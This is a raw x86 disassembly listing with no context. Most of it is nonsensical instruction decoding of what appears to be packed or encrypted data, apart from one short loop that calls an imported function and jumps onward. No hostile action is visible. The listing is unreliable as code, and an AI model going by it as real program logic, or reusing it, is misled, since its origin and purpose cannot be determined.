  417646:	shl    DWORD PTR [eax],1
  417648:	xor    DWORD PTR [edi],0xb61fa34f
  41764e:	mov    eax,ds:0x3f16d473
  417653:	mov    bl,0x62
  417655:	push   edi
  417656:	int3   
  417657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417658:	stc    
  417659:	(bad)
  41765c:	mov    dl,BYTE PTR [ecx]
  41765e:	call   0xadd59a1b
  417663:	cmp    DWORD PTR [ecx],edx
  417665:	mov    esp,0x6601cee5
  41766a:	add    esi,DWORD PTR [esi+0x626ed973]
  417670:	or     cl,BYTE PTR [ecx-0x44]
  417673:	sub    eax,0xc9211260
  417678:	mov    cl,BYTE PTR [eax+0x3fb67fd1]
  41767e:	mov    WORD PTR ds:0x841efc33,gs
  417684:	mov    bl,cl
  417686:	pop    edi
  417687:	jb     0x417680
  417689:	fs inc esp
  41768b:	or     al,0x68
  41768d:	in     al,dx
  41768e:	sub    DWORD PTR [eax-0x604873e8],edi
  417694:	xor    ebp,DWORD PTR [ecx+eiz*1+0x56f1e842]
  41769b:	mov    ch,BYTE PTR [ebp-0x2]
  41769e:	inc    edi
  41769f:	cmc    
  4176a0:	pop    ecx
  4176a1:	not    DWORD PTR [ecx]
  4176a3:	cdq    
  4176a4:	popa   
  4176a5:	test   BYTE PTR [ebx+0x20],cl
  4176a8:	(bad)  
  4176a9:	jmp    0x4959:0xfa876ea
  4176b0:	or     al,0x1f
  4176b2:	aas    
  4176b3:	add    ah,cl
  4176b5:	stos   BYTE PTR es:[edi],al
  4176b6:	cmp    BYTE PTR [eax-0x23],0xb6
  4176ba:	imul   esi,DWORD PTR [ecx+0x4a],0x21b0ee52
  4176c1:	inc    BYTE PTR [ebx]
  4176c3:	cmp    BYTE PTR [esi+0x31],cl
  4176c6:	mov    edx,0x1f37b392
  4176cb:	int3   
  4176cc:	imul   esi,DWORD PTR [edi+0x24],0x1d
  4176d0:	pop    es
  4176d1:	mov    al,ds:0xefb907e6
  4176d6:	cli    
  4176d7:	or     edx,DWORD PTR [ebp-0x251d1600]
  4176dd:	mov    ch,0x15
  4176df:	(bad)  
  4176e1:	xchg   edi,eax
  4176e2:	div    ah
  4176e4:	clc    
  4176e5:	dec    ecx
  4176e6:	aaa    
  4176e7:	cld    
  4176e8:	call   0xd153:0x329a2dad
  4176ef:	sub    DWORD PTR [edx-0x16c24126],eax
  4176f5:	mov    DWORD PTR [ebp+0x51],edi
  4176f8:	in     al,0xdd
  4176fa:	push   ecx
  4176fb:	add    ebx,ecx
  4176fd:	mov    DWORD PTR [eax],ebx
  4176ff:	mov    edi,0xd26dc8f5
  417704:	imul   edx,esp,0xffffffe4
  417707:	inc    ecx
  417708:	mov    ch,0x5e
  41770a:	into   
  41770b:	icebp  
  41770c:	xchg   esp,eax
  41770d:	in     eax,dx
  41770e:	xchg   edx,eax
  41770f:	add    DWORD PTR [edx+0x5ed2080],ebx
  417715:	xchg   edi,eax
  417716:	mov    eax,0x7866823e
  41771b:	test   eax,0xfa14f7b8
  417720:	in     eax,0x72
  417722:	inc    eax
  417723:	les    ebp,FWORD PTR [edx+0x2e111e66]
  417729:	lea    esp,[edi]
  41772b:	mov    eax,fs
  41772d:	call   0x2634:0x4df9617f
  417734:	mov    esi,0x267ae42
  417739:	je     0x41777c
  41773b:	sahf   
  41773c:	fnstcw WORD PTR [eax+0x6b]
  41773f:	enter  0xf075,0x64
  417743:	test   eax,0x3b22e778
  417748:	cs out 0x78,al
  41774b:	out    dx,eax
  41774c:	sbb    ah,0xe2
  41774f:	(bad)  
  417750:	daa    
  417751:	and    eax,0x703e43a2
  417756:	lods   eax,DWORD PTR ds:[esi]
  417757:	pop    ebx
  417758:	cmp    al,BYTE PTR [esi+0x57a69b8b]
  41775e:	jo     0x4177b9
  417760:	inc    esp
  417761:	xor    DWORD PTR [edi-0x60f8ccba],ebx
  417767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417768:	int    0x10
  41776a:	leave  
  41776b:	hlt    
  41776c:	sub    al,0x29
  41776e:	sub    al,0x25
  417770:	nop
  417771:	leave  
  417772:	leave  
  417773:	jmp    0xd8425da1
  417778:	inc    ecx
  417779:	call   0x2ba2:0x514bd133
  417780:	inc    esp
  417781:	push   cs
  417782:	inc    esi
  417783:	sar    DWORD PTR [edx],cl
  417785:	xchg   ecx,eax
  417786:	mov    ds:0x6d4623de,al
  41778b:	cmp    edi,DWORD PTR [ebx+eiz*4+0x6c56b151]
  417792:	push   ebx
  417793:	pop    edi
  417794:	sub    edi,edi
  417796:	mov    esp,0xe145127e
  41779b:	mov    dh,0x7f
  41779d:	sub    BYTE PTR [edi+0x3f762694],al
  4177a3:	in     eax,0x10
  4177a5:	add    BYTE PTR [edi-0x5f5906eb],ch
  4177ab:	shl    DWORD PTR [ebp+edi*4+0x61c2e36b],1
  4177b2:	aam    0x40
  4177b4:	dec    ebp
  4177b5:	jecxz  0x4177cd
  4177b7:	inc    ecx
  4177b8:	sbb    eax,0x98b9229e
  4177bd:	jb     0x4177f1
  4177bf:	add    cl,ch
  4177c1:	or     eax,0xc5000005
  4177c6:	mov    ch,0xc8
  4177c9:	(bad)
  4177cc:	aad    0x91
  4177ce:	xor    eax,0x7724f48d
  4177d3:	mul    DWORD PTR ds:0x787fd7c4
  4177d9:	jae    0x417857
  4177db:	js     0x417855
  4177dd:	into   
  4177de:	fwait
  4177df:	test   al,0xa0
  4177e1:	push   ss
  4177e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e3:	data16 sub al,0x75
  4177e6:	jnp    0x417785
  4177e8:	je     0x4177cb
  4177ea:	push   eax
  4177eb:	jp     0x4177b8
  4177ed:	popf   
  4177ee:	loope  0x41782c
  4177f0:	(bad)  
  4177f1:	std    
  4177f2:	in     eax,0x6f
  4177f4:	aad    0xba
  4177f6:	mov    ds:0x6e337a29,al
  4177fb:	call   DWORD PTR [edx]
  4177fd:	in     al,dx
  4177fe:	cmp    DWORD PTR [eax],ebx
  417800:	(bad)  
  417801:	mov    ds:0x7d628e15,eax
  417806:	cmp    BYTE PTR [esi+ebx*1-0x5308dac5],al
  41780d:	jp     0x417825
  41780f:	(bad)  
  417810:	push   cs
  417811:	not    DWORD PTR [ebx]
  417813:	push   ebp
  417814:	popf   
  417815:	mov    al,0xa6
  417817:	xchg   esp,eax
  417818:	in     eax,dx
  417819:	cdq    
  41781a:	scas   eax,DWORD PTR es:[edi]
  41781b:	jnp    0x417860
  41781d:	cld    
  41781e:	fsub   DWORD PTR [esi]
  417820:	mov    esp,fs
  417822:	ficom  DWORD PTR [ecx-0x342707cd]
  417828:	dec    edx
  417829:	jno    0x41787b
  41782b:	fnstsw WORD PTR [esi+0x3f2cd502]
  417831:	mov    eax,DWORD PTR [ebp-0x73]
  417834:	adc    eax,0xed101d63
  417839:	out    dx,al
  41783a:	lea    ecx,[ebx-0x78]
  41783d:	sahf   
  41783e:	sbb    eax,0xfa3df6db
  417843:	scas   eax,DWORD PTR es:[edi]
  417844:	call   0x4b04:0x8e986f2e
  41784b:	mov    BYTE PTR [edx+0x3698a971],al
  417851:	jo     0x41786b
  417853:	ss pushf 
  417855:	jae    0x417839
  417857:	fbld   TBYTE PTR [edi+0x4f1d29fa]
  41785d:	jae    0x41789c
  41785f:	adc    BYTE PTR [edi-0x51594a5c],0x8a
  417866:	pop    ebp
  417867:	rcl    BYTE PTR [ecx-0x2c9a8e2b],0x5d
  41786e:	mov    ecx,esi
  417870:	rol    bl,0x20
  417873:	sub    DWORD PTR [esi],edi
  417875:	xor    edx,ecx
  417877:	(bad)  
  417878:	jmp    0x499b:0x36e0bd07
  41787f:	push   esp
  417880:	loop   0x41781d
  417882:	rcl    cl,cl
  417884:	adc    eax,0xbedc81f6
  417889:	sti    
  41788a:	mov    DWORD PTR [ebp+0x56],esi
  41788d:	xchg   edx,eax
  41788e:	imul   edi,DWORD PTR [edi],0xfffffffd
  417891:	push   0xc0c001fa
  417896:	in     al,dx
  417897:	out    dx,al
  417898:	mov    dh,BYTE PTR [edx+0x3b5ebda1]
  41789e:	or     BYTE PTR [eax-0x44c80df8],cl
  4178a4:	cmp    BYTE PTR [edi+ecx*2-0x6486f956],ah
  4178ab:	mov    esp,0x77a60b66
  4178b0:	div    DWORD PTR [ecx+0x47add4a5]
  4178b6:	cmp    bh,ah
  4178b8:	mov    ecx,0x115473ca
  4178bd:	xor    DWORD PTR [ebp+0xa],esi
  4178c0:	add    ebp,DWORD PTR [edx]
  4178c2:	cmp    esi,DWORD PTR ds:0xf41bb64a
  4178c8:	xchg   edi,eax
  4178ca:	or     eax,DWORD PTR [eax+0x2f9e8a73]
  4178d0:	cld    
  4178d1:	stc    
  4178d2:	fwait
  4178d3:	scas   al,BYTE PTR es:[edi]
  4178d4:	push   cs
  4178d5:	pop    ss
  4178d6:	push   ebp
  4178d7:	pop    edx
  4178d8:	clc    
  4178d9:	or     bl,BYTE PTR [esi+0x1938de7]
  4178df:	pop    ds
  4178e0:	into   
  4178e1:	mov    dh,0x6a
  4178e3:	jns    0x4178d8
  4178e5:	lods   al,BYTE PTR ds:[esi]
  4178e6:	outs   dx,DWORD PTR ds:[esi]
  4178e7:	and    DWORD PTR [edx],ebp
  4178e9:	adc    bh,BYTE PTR [edx-0x19]
  4178ec:	adc    cl,BYTE PTR [ecx+0x20]
  4178ef:	icebp  
  4178f0:	push   edx
  4178f1:	es sbb bh,dl
  4178f4:	jle    0x417899
  4178f6:	in     al,0x5e
  4178f8:	shr    DWORD PTR [edi+0x26],cl
  4178fb:	mov    al,ds:0xb073a01f
  417900:	and    eax,0x380b713e
  417905:	inc    edx
  417906:	in     al,0xbc
  417908:	fnstcw WORD PTR [esi+0x32]
  41790b:	jbe    0x4178d7
  41790d:	fidiv  WORD PTR [edx-0x7a14bd13]
  417913:	and    eax,0xece6c30a
  417918:	fdivp  st(1),st
  41791a:	jp     0x417909
  41791c:	jo     0x4178cc
  41791e:	ret    
  41791f:	imul   eax,DWORD PTR [esi+edx*4],0x16
  417923:	lods   al,BYTE PTR ds:[esi]
  417924:	test   DWORD PTR [edx+ecx*2],ebp
  417927:	mov    al,ds:0x456b6834
  41792c:	scas   eax,DWORD PTR es:[edi]
  41792d:	adc    cl,ch
  41792f:	sub    BYTE PTR [ebp-0x18],ch
  417932:	mov    ds:0xb226f1f1,eax
  417937:	mov    edi,0xa7d6b6fa
  41793c:	push   esp
  41793d:	dec    ecx
  41793e:	jnp    0x41794d
  417940:	ret    0x75d
  417943:	add    esi,DWORD PTR [ebx+0x7d59653a]
  417949:	popa   
  41794a:	mov    sp,WORD PTR [esp+ebx*8+0x4beee3e1]
  417952:	adc    al,0x1
  417954:	jmp    0xd5d9:0xe543bb21
  41795b:	jb     0x4179c9
  41795d:	inc    edi
  41795e:	addr16 out 0x3,eax
  417961:	lods   eax,DWORD PTR ds:[esi]
  417962:	cmp    BYTE PTR [eax+0x24],dh
  417965:	(bad)  
  417967:	or     al,0x6a
  417969:	enter  0x83bf,0xa5
  41796d:	and    BYTE PTR [edx+eiz*4+0x60f688f4],cl
  417974:	shl    DWORD PTR [edx+ecx*1+0x73],1
  417978:	add    al,0x42
  41797a:	loope  0x4179c4
  41797c:	test   DWORD PTR [edi],0xe6a701d1
  417982:	mov    edx,0xf3f0cdd3
  417987:	(bad)  
  417989:	and    BYTE PTR [edi],dh
  41798b:	and    al,0x86
  41798d:	ret    0x3e3b
  417990:	pushf  
  417991:	js     0x417a03
  417993:	push   eax
  417994:	sub    BYTE PTR [ebp-0x16a757c],al
  41799a:	push   esp
  41799b:	xchg   esp,eax
  41799c:	cmp    esp,DWORD PTR [ebx+ebp*2]
  41799f:	rcl    BYTE PTR [edi+ebp*8+0x57],1
  4179a3:	mov    ah,0x97
  4179a5:	add    ebp,ecx
  4179a7:	hlt    
  4179a8:	out    dx,al
  4179a9:	push   ds
  4179aa:	imul   esp,DWORD PTR [edi+esi*4-0x4a4e2f20],0x3b12e1ea
  4179b5:	arpl   WORD PTR [esi+0x76],si
  4179b8:	stos   BYTE PTR es:[edi],al
  4179b9:	adc    ah,dl
  4179bb:	add    edi,DWORD PTR [edx+0x822c2c8]
  4179c1:	and    eax,0x61edb6a3
  4179c6:	mov    edi,ebp
  4179c8:	(bad)  [ebx+0x48]
  4179cb:	and    al,0x87
  4179cd:	sub    dl,cl
  4179cf:	push   es
  4179d0:	mov    ch,0x3
  4179d2:	inc    ebp
  4179d3:	push   ss
  4179d4:	mov    ds:0xfaaac7b9,al
  4179d9:	repz sub BYTE PTR [ebx-0x3037530b],cl
  4179e0:	in     eax,0xa6
  4179e2:	pop    ebp
  4179e3:	xor    dl,cl
  4179e5:	xor    BYTE PTR [esi+0x707cb120],0xe6
  4179ec:	lods   eax,DWORD PTR ds:[esi]
  4179ed:	sahf   
  4179ee:	mov    bh,0xd0
  4179f0:	xor    edi,DWORD PTR [edx-0x36]
  4179f3:	mov    bl,0x79
  4179f5:	sbb    al,0xe
  4179f7:	sub    al,dh
  4179f9:	mov    ds:0x19ab3482,al
  4179fe:	jnp    0x4179bb
  417a00:	aas    
  417a01:	scas   al,BYTE PTR es:[edi]
  417a02:	stc    
  417a03:	sub    eax,DWORD PTR [ecx+0x36dd2b07]
  417a09:	ins    BYTE PTR es:[edi],dx
  417a0a:	mov    ch,0xca
  417a0c:	ror    BYTE PTR [esi-0x1c66f3c0],cl
  417a12:	add    eax,0x8f85cdbf
  417a17:	inc    edi
  417a18:	cli    
  417a19:	(bad)
  417a1c:	inc    eax
  417a1d:	call   0x66f7:0xcf8ba6e2
  417a24:	arpl   WORD PTR [eiz*2-0x1950fdcb],bp
  417a2b:	xor    al,0x90
  417a2d:	sysexit 
  417a2f:	push   ss
  417a30:	scas   eax,DWORD PTR es:[edi]
  417a31:	cmp    BYTE PTR [ebx],dh
  417a33:	jge    0x417a2d
  417a35:	add    eax,0x563ceadb
  417a3a:	push   ecx
  417a3b:	xchg   esi,eax
  417a3c:	mov    ds:0x89b5857e,al
  417a41:	aas    
  417a42:	add    DWORD PTR [edi],eax
  417a44:	shr    DWORD PTR [esi+ebx*1-0x45],cl
  417a48:	and    edx,ecx
  417a4a:	hlt    
  417a4b:	or     ah,BYTE PTR [edi+0x64ea7fe2]
  417a51:	int3   
  417a52:	cmp    ch,BYTE PTR [edi]
  417a54:	adc    BYTE PTR [edx+0x7d],al
  417a57:	scas   eax,DWORD PTR es:[edi]
  417a58:	(bad)  
  417a59:	(bad)  
  417a5a:	lock mov ds:0xb414f5b1,eax
  417a60:	test   al,0x3c
  417a62:	in     eax,0xf4
  417a64:	retf   0x51c
  417a67:	mov    ah,0x74
  417a69:	add    dh,BYTE PTR [ecx+esi*4]
  417a6c:	jg     0x417a32
  417a6e:	int    0xb3
  417a70:	jmp    0x417a3b
  417a72:	jnp    0x417a34
  417a74:	cs (bad) 
  417a77:	lods   al,BYTE PTR ds:[esi]
  417a78:	mov    edi,0x393fda5e
  417a7d:	fild   DWORD PTR [edi]
  417a7f:	push   edi
  417a80:	outs   dx,BYTE PTR ds:[esi]
  417a81:	xor    eax,DWORD PTR [esi]
  417a83:	push   eax
  417a84:	add    eax,0xf6f7bb7d
  417a89:	add    al,0x5a
  417a8b:	call   0x22124a81
  417a90:	sbb    al,0xe4
  417a92:	add    DWORD PTR [esi-0x7f0c0572],ecx
  417a98:	add    esp,DWORD PTR [edi-0x7df9930d]
  417a9e:	push   cs
  417a9f:	jae    0x417b12
  417aa1:	xchg   esp,eax
  417aa2:	lea    esp,[ecx+eax*2+0x4a8ed163]
  417aa9:	nop
  417aaa:	shl    BYTE PTR [ebx-0x711ec81d],0x5e
  417ab1:	dec    eax
  417ab2:	fsubr  DWORD PTR [esi+0x79]
  417ab5:	mov    cl,0xc7
  417ab7:	sbb    BYTE PTR [esp+eiz*8-0x34],al
  417abb:	sub    al,0x19
  417abd:	sub    al,0x78
  417abf:	sub    esp,DWORD PTR [ebx]
  417ac1:	adc    DWORD PTR [eax],0x9542958
  417ac7:	cmp    bl,BYTE PTR [ebx]
  417ac9:	js     0x417aa3
  417acb:	dec    edx
  417acc:	es cli 
  417ace:	mov    esp,0x5e6f6f1b
  417ad3:	scas   al,BYTE PTR es:[edi]
  417ad4:	push   ss
  417ad5:	inc    eax
  417ad6:	add    BYTE PTR [ecx+0x73],dl
  417ad9:	mov    esi,0xda766591
  417ade:	sbb    DWORD PTR [ebx+ebx*4],0x7c
  417ae2:	and    esi,DWORD PTR [eax]
  417ae4:	mov    eax,0x635d2204
  417ae9:	sub    ebp,esi
  417aeb:	test   DWORD PTR [edi-0x50b0f084],edi
  417af1:	xor    DWORD PTR [edi+eiz*2-0x13],ebp
  417af5:	mov    edi,0x85a43c83
  417afa:	stc    
  417afb:	cli    
  417afc:	jb     0x417b44
  417afe:	pop    ebx
  417aff:	sbb    BYTE PTR ds:0x67246fcd,dh
  417b05:	(bad)  
  417b06:	xor    BYTE PTR [esp+ecx*4],bl
  417b09:	xchg   ebx,eax
  417b0a:	push   cs
  417b0b:	adc    BYTE PTR [ebx+0x41],dh
  417b0e:	pop    edx
  417b0f:	es call 0xb416:0x61180f4b
  417b17:	xchg   esp,eax
  417b18:	inc    esi
  417b19:	das    
  417b1a:	jp     0x417abd
  417b1c:	cld    
  417b1d:	jp     0x417afc
  417b1f:	sti    
  417b20:	mov    ah,0x90
  417b22:	retf   0x9459
  417b25:	ss test ecx,ecx
  417b28:	lods   al,BYTE PTR ds:[esi]
  417b29:	bound  ecx,QWORD PTR [edi+0x4d]
  417b2c:	imul   esp,DWORD PTR [edx+0x6a],0x4c
  417b30:	xlat   BYTE PTR ds:[ebx]
  417b31:	test   bl,0x96
  417b34:	(bad)
  417b37:	(bad)  
  417b38:	(bad)  
  417b39:	jle    0x417b6a
  417b3b:	outs   dx,BYTE PTR ds:[esi]
  417b3c:	add    DWORD PTR [edi],ebp
  417b3e:	ss repz sub dl,dh
  417b42:	out    dx,al
  417b43:	push   ebp
  417b44:	mov    ebx,0x4f66292d
  417b49:	xchg   ebp,eax
  417b4a:	or     DWORD PTR [eax+eiz*2-0x37],eax
  417b4e:	in     al,dx
  417b4f:	jp     0x417b27
  417b51:	mov    ah,0x93
  417b53:	into   
  417b54:	ja     0x417b0a
  417b56:	xchg   esi,eax
  417b57:	test   eax,0x89369dbc
  417b5c:	push   edx
  417b5d:	cwde   
  417b5e:	sbb    edx,edi
  417b60:	mov    ds,edi
  417b62:	in     eax,0x6c
  417b64:	xchg   ebx,eax
  417b65:	cli    
  417b66:	mov    esp,0x3fd0ec65
  417b6b:	das    
  417b6c:	jno    0x417ba7
  417b6e:	call   0xf5ef2a8d
  417b73:	fwait
  417b74:	es pushw ss
  417b77:	fild   WORD PTR [edx]
  417b79:	ja     0x417b41
  417b7b:	jmp    0xf7ffda6d
  417b80:	dec    eax
  417b81:	sub    DWORD PTR ds:0xd5b90914,edi
  417b87:	jnp    0x417b8d
  417b89:	dec    esp
  417b8a:	adc    eax,0xefdf0009
  417b8f:	add    eax,0x1dec304d
  417b94:	retf   
  417b95:	ffree  st(4)
  417b97:	push   ebp
  417b98:	shl    bh,cl
  417b9a:	push   es
  417b9b:	mov    ah,BYTE PTR [ebp*2+0x5cceee1b]
  417ba2:	mov    al,ds:0x6580d6e1
  417ba7:	adc    DWORD PTR [esi+0x3c],0xa94dedaf
  417bae:	cwde   
  417baf:	mov    edx,0x47c7263c
  417bb4:	mov    bh,0x2f
  417bb6:	adc    eax,0x8fcc3b03
  417bbb:	mov    bl,0xe2
  417bbd:	sub    dh,BYTE PTR [ebx+ebx*4]
  417bc0:	inc    ecx
  417bc1:	cld    
  417bc2:	pushf  
  417bc3:	and    DWORD PTR [ebx+0x59246d2],0xfffffff5
  417bca:	or     al,BYTE PTR [eax+0x35]
  417bcd:	push   eax
  417bce:	add    DWORD PTR [edx+0x5f],0xffffff92
  417bd2:	addr16 xor eax,0xcc7185f3
  417bd8:	pop    ecx
  417bd9:	xchg   edx,eax
  417bda:	mov    esp,0xbb17aadc
  417bdf:	adc    esp,DWORD PTR [esi]
  417be1:	mov    ecx,0x19c38d2a
  417be6:	in     eax,dx
  417be7:	outs   dx,BYTE PTR ds:[esi]
  417be8:	(bad)  
  417be9:	or     eax,0xa61ca3bd
  417bee:	sbb    DWORD PTR [edx],esp
  417bf0:	lods   al,BYTE PTR ds:[esi]
  417bf1:	call   0xcb72ace9
  417bf6:	daa    
  417bf7:	jecxz  0x417bab
  417bf9:	mov    cl,0x9f
  417bfb:	inc    esp
  417bfc:	out    0x9e,eax
  417bfe:	dec    ecx
  417bff:	mov    esp,0xad80a0c2
  417c04:	jnp    0x417bb1
  417c06:	out    dx,al
  417c07:	aas    
  417c08:	call   0xa6e7:0x74628b8
  417c0f:	jnp    0x417c77
  417c11:	fstp   DWORD PTR [ebx]
  417c13:	xchg   esp,eax
  417c14:	and    BYTE PTR [esi-0x656d7998],dh
  417c1a:	inc    ecx
  417c1b:	ja     0x417c70
  417c1d:	sub    ecx,DWORD PTR [edx+0x7fa41cd3]
  417c23:	lods   eax,DWORD PTR ds:[esi]
  417c24:	xchg   ebx,eax
  417c25:	fdiv   st,st(6)
  417c27:	sub    ecx,DWORD PTR [esi]
  417c29:	jle    0x417ca8
  417c2b:	mov    esp,0x4eadb251
  417c30:	mov    bl,BYTE PTR es:[eax+esi*2]
  417c34:	and    cl,BYTE PTR [edi+0x68]
  417c37:	cmp    al,0x25
  417c39:	jno    0x417c8c
  417c3b:	or     al,0x61
  417c3d:	xlat   BYTE PTR ds:[ebx]
  417c3e:	fnstsw WORD PTR [eax+esi*8]
  417c41:	push   ebx
  417c42:	loopne 0x417bd5
  417c44:	pop    ecx
  417c45:	mov    ecx,0xa97c564a
  417c4a:	jne    0x417cab
  417c4c:	in     al,0xda
  417c4e:	pop    es
  417c4f:	std    
  417c50:	add    eax,0x9c5a167
  417c55:	cwde   
  417c56:	push   esi
  417c57:	shl    DWORD PTR [ebp+0x2c04817c],cl
  417c5d:	or     ebx,esi
  417c5f:	xchg   BYTE PTR ds:0xebddd942,ah
  417c65:	jae    0x417ccc
  417c67:	je     0x417c15
  417c69:	idiv   dh
  417c6b:	in     al,dx
  417c6c:	cli    
  417c6d:	xchg   ecx,eax
  417c6e:	ret    0x88c4
  417c71:	sub    al,BYTE PTR [ebp+edx*2-0xf]
  417c75:	dec    edx
  417c76:	rcr    DWORD PTR [edi+ecx*8-0xff8675d],1
  417c7d:	ror    ah,cl
  417c7f:	test   BYTE PTR [ebx-0x7d813055],0xd3
  417c86:	ret    0xfaeb
  417c89:	sub    DWORD PTR [ecx+0x57],0xffffff99
  417c8d:	mov    ebp,0xc83bb9b9
  417c92:	dec    edi
  417c93:	jae    0x417cc6
  417c95:	repnz and BYTE PTR [esi-0xfe7d6f1],0x50
  417c9d:	xor    ebp,DWORD PTR [edx]
  417c9f:	fistp  DWORD PTR [edx+eax*2]
  417ca2:	stos   BYTE PTR es:[edi],al
  417ca3:	pop    edx
  417ca4:	lods   al,BYTE PTR ds:[esi]
  417ca5:	rol    edx,0x19
  417ca8:	add    bl,BYTE PTR [edx-0x7861a118]
  417cae:	cdq    
  417caf:	scas   al,BYTE PTR es:[edi]
  417cb0:	sar    DWORD PTR [ebx],cl
  417cb2:	je     0x417c36
  417cb4:	mov    eax,0xbacbd3df
  417cb9:	inc    esi
  417cba:	ins    BYTE PTR es:[edi],dx
  417cbb:	mov    eax,ds:0xd522a7f3
  417cc0:	jne    0x417c8e
  417cc2:	inc    edi
  417cc3:	jno    0x417c47
  417cc5:	arpl   WORD PTR [edx+edi*1],sp
  417cc8:	sbb    eax,0x279b321d
  417ccd:	cdq    
  417cce:	mov    eax,ds:0x39f1e04
  417cd3:	shr    DWORD PTR [ebx],1
  417cd5:	cmp    eax,0x42a3fd
  417cda:	mov    DWORD PTR [ebp-0x8],edx
  417cdd:	mov    DWORD PTR ds:0x42a379,0x16
  417ce7:	cmp    DWORD PTR ds:0x42a379,0x0
  417cee:	je     0x417d21
  417cf4:	cmp    DWORD PTR ds:0x42a379,0x24
  417cfb:	jne    0x417d0f
  417d01:	push   DWORD PTR [ebp-0x28]
  417d04:	push   0x42a3c1
  417d09:	call   DWORD PTR ds:0x4251e0
  417d0f:	mov    edi,DWORD PTR ds:0x42a379
  417d15:	dec    edi
  417d16:	mov    DWORD PTR ds:0x42a379,edi
  417d1c:	jmp    0x417ce7
  417d21:	mov    edx,DWORD PTR [ebp+0x8]
  417d24:	mov    DWORD PTR ds:0x42a381,0x4d18
  417d2e:	jmp    0x418240
  417d33:	into   
  417d34:	(bad)
  417d38:	(bad)  
  417d39:	(bad)  
  417d3b:	xchg   edi,ebp
  417d3d:	push   ebx
  417d3e:	call   0x72f7c155
  417d43:	aas    
  417d44:	fidivr DWORD PTR [edi+0x78]
  417d47:	jae    0x417dc5
  417d49:	js     0x417dc3
  417d4b:	gs (bad) 
  417d4d:	mov    BYTE PTR [ebp+eiz*1+0x1c],ah
  417d51:	out    0x80,eax
  417d53:	add    al,0xfa
  417d55:	retf   0xbcb2
  417d58:	test   al,bh
  417d5a:	push   ss
  417d5b:	jg     0x417d00
  417d5d:	jo     0x417dd1
  417d5f:	pusha  
  417d60:	stc    
  417d61:	mov    esi,0x66ad9122
  417d66:	les    esi,FWORD PTR [eax-0x7b]
  417d69:	aad    0x96
  417d6b:	bound  ebp,QWORD PTR [edi]
  417d6d:	aaa    
  417d6e:	dec    edx
  417d6f:	in     al,dx
  417d70:	fsubr  st(5),st
  417d72:	mov    WORD PTR [edi-0x75167233],ds
  417d78:	dec    ecx
  417d79:	aaa    
  417d7a:	mov    cl,0x7b
  417d7c:	mov    eax,esi
  417d7e:	aas    
  417d7f:	std    
  417d80:	jmp    0x417d14
  417d82:	xchg   esi,eax
  417d83:	test   eax,0x110ce9ab
  417d88:	push   ss
  417d89:	inc    esi
  417d8a:	mov    ecx,0x4ba8f98a
  417d8f:	adc    al,0x8b
  417d91:	popf   
  417d92:	sbb    esp,DWORD PTR [edi+0x78]
  417d95:	daa    
  417d96:	in     al,dx
  417d97:	xchg   esi,eax
  417d98:	in     al,0x7d
  417d9a:	pop    ss
  417d9b:	xchg   ebp,eax
  417d9c:	sub    ah,BYTE PTR ds:0xf0e79ed5
  417da2:	push   0x327f12db
  417da7:	retf   0xb6be
  417daa:	push   ss
  417dab:	clc    
  417dac:	or     edx,DWORD PTR [edi+0x66895259]
  417db2:	cmp    edi,edx
  417db4:	repz dec edx
  417db6:	jecxz  0x417d80
  417db8:	xor    esp,DWORD PTR [esi+0x7c139854]
  417dbe:	mov    eax,0x202d2a92
  417dc3:	adc    eax,edx
  417dc5:	add    ebp,esi
  417dc7:	xor    al,0x57
  417dc9:	mov    cs,WORD PTR [ebp+0x6d66f323]
  417dcf:	in     eax,0xb9
  417dd1:	gs dec ecx
  417dd3:	retf   0x2275
  417dd6:	mov    ch,0x0
  417dd8:	loop   0x417e16
  417dda:	scas   al,BYTE PTR es:[edi]
  417ddb:	aas    
  417ddc:	jmp    0x7ef153de
  417de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de2:	mov    WORD PTR ds:0x289e86d9,?
  417de8:	data16 sbb dl,BYTE PTR [edx-0x6ddef588]
  417def:	aad    0xd0
  417df1:	pop    es
  417df2:	stos   DWORD PTR es:[edi],eax
  417df3:	out    dx,eax
  417df4:	rcl    DWORD PTR [eax+0x31],1
  417df7:	cmp    al,0x74
  417df9:	inc    esp
  417dfa:	shl    cl,cl
  417dfc:	jno    0x417e52
  417dfe:	leave  
  417dff:	aas    
  417e00:	xchg   ebx,eax
  417e01:	in     al,dx
  417e02:	dec    esp
  417e03:	scas   eax,DWORD PTR es:[edi]
  417e04:	or     al,0xbe
  417e06:	add    esi,edx
  417e08:	call   0x3f3e9f83
  417e0d:	in     eax,0xa
  417e0f:	and    edi,DWORD PTR [esi]
  417e11:	xor    bh,BYTE PTR [esi+0x11ca7ea4]
  417e17:	jl     0x417db5
  417e19:	adc    ebp,edi
  417e1b:	fld    DWORD PTR [ebx+0x51d080a9]
  417e21:	sbb    al,0xb5
  417e23:	retf   0xa6c8
  417e26:	push   ebx
  417e27:	bound  edi,QWORD PTR [edi+0x4a]
  417e2a:	fmul   QWORD PTR [ecx]
  417e2c:	mov    ds,WORD PTR [ecx]
  417e2e:	sub    BYTE PTR [esi],dh
  417e30:	mov    ah,0x44
  417e32:	cwde   
  417e33:	loopne 0x417e14
  417e35:	dec    esp
  417e36:	jb     0x417e8d
  417e38:	fs aas 
  417e3a:	jnp    0x417e9c
  417e3c:	sub    edi,ebx
  417e3e:	xor    eax,0xc5dc1127
  417e43:	adc    cl,BYTE PTR [ebx-0x42279ba1]
  417e49:	inc    esp
  417e4a:	xchg   ebx,eax
  417e4b:	mov    ch,0x7e
  417e4d:	bound  esp,QWORD PTR [edx]
  417e4f:	std    
  417e50:	xor    BYTE PTR [edx+esi*2-0x8ed383f],al
  417e57:	mov    bl,0x73
  417e59:	test   al,0x81
  417e5b:	mov    edi,0x8f309b22
  417e60:	mov    bh,0x3d
  417e62:	sahf   
  417e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e64:	aam    0x48
  417e66:	push   0xffffffd0
  417e68:	dec    ebp
  417e69:	sbb    DWORD PTR [edx],ebp
  417e6b:	or     bl,BYTE PTR [ecx+eiz*8+0x674bca37]
  417e72:	mov    ch,0xfb
  417e74:	sbb    bh,cl
  417e76:	cmp    eax,0x2fc7522a
  417e7b:	adc    DWORD PTR [ebx+0x46],ebx
  417e7e:	xchg   BYTE PTR [ebp+ecx*2-0x4f90e0e2],ch
  417e85:	mov    DWORD PTR [edx-0x52557629],ecx
  417e8b:	or     ah,dh
